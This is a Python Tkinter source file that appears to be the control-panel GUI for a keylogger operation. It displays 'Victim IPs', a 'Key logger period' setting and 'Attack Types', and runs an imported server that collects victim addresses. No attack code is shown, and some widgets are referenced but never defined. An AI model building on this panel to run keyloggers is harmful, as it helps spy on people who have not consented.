import os
import socket
import tkinter as tk
from tkinter import ttk
from tkinter import filedialog
import subprocess as commands
import threading
from server import app, victim_ips

OWD = os.getcwd()
v_ip_labels = []

class Gui(tk.Tk):

    def __init__(self):
        tk.Tk.__init__(self)

        frames = []
        for i in range(1, 16):
            frames.append(ttk.Frame(self))

        self.ip_address = get_ip_address()

        ttk.Label(frames[0], text='Your IP address:  {}'.format(self.ip_address), font='Helvetica 10 bold').pack()
        ttk.Label(frames[1], text='Key logger period: (hours) ', font='Helvetica 10 bold').pack(side='left')

        ttk.Label(frames[2], text='Directory to save: ', font='Helvetica 10 bold').pack(side='left')
        self.path_entry = ttk.Entry(frames[2], width=70)
        self.path_entry.insert('end', OWD)
        self.path_entry.pack(side='left')

        ttk.Button(frames[2], text='Browse', command=self.browse).pack(side='left', padx=10)

        ttk.Label(frames[3], text='Attack Types: ', font='Helvetica 10 bold').pack(side='left')

        ttk.Label(frames[4], text='Victim IPs: ', font='Helvetica 10 bold').pack(side='left')
        for i in range(9):
            v_ip_labels.append(ttk.Label(frames[6 + i], text='', font='Helvetica 10'))
            v_ip_labels[-1].pack(side='left')
        ttk.Label(frames[5], text='Server state: ', font='Helvetica 10 bold').pack(side='left')
        self.serverstate_lbl = ttk.Label(frames[5], text='Running', font='Helvetica 15 bold', foreground='green')
        self.serverstate_lbl.pack(side='left')

        frames[0].grid(column=1, row=1, padx=10, pady=10, sticky='w')
        frames[1].grid(column=1, row=2, padx=10, pady=10, sticky='w')
        frames[2].grid(column=1, row=3, columnspan=3, padx=10, pady=10, sticky='w')
        frames[3].grid(column=1, row=4, padx=10, pady=10, sticky='w')
        frames[4].grid(column=1, row=5, padx=10, pady=10, sticky='w')
        frames[5].grid(column=3, row=6, padx=10, pady=10, sticky='w')

        for i in range(9):
            frames[6 + i].grid(column=1, row=6+i, padx=10, pady=10, sticky='w')

        self.serverThread = threading.Thread(target=lambda: app.run(debug=False)).start()


    def browse(self):
        path = filedialog.askdirectory()
        if os.path.isdir(path):
            self.path_entry.delete('0', tk.END)
            self.path_entry.insert('end', path)


    def toggle_state_widgets(self):
        if self.server_running:
            self.start_btn.configure(state='disabled')
            self.stop_btn.configure(state='normal')
            txt = 'Serving'
            color = 'green'
        else:
            self.start_btn.configure(state='normal')
            self.stop_btn.configure(state='disabled')
            txt = 'Stopped'
            color = 'red'
        self.serverstate_lbl.configure(text=txt, foreground=color)


def get_ip_address():
    if os.name == 'posix':
        ip = commands.getoutput("hostname -I")
    elif os.name == 'nt':
        ip = socket.gethostbyname(socket.gethostname())
    else:
        ip = ''
        print('Couldn\'t get local ip')
    return ip

def switch_dir(path):
    if os.path.isdir(path):
        os.chdir(path)
        return True
    if path == '':
        os.chdir(OWD)
        return True
    else:
        return

root = Gui()

def addIP():
    v_ip_labels[0].configure(text=victim_ips[0])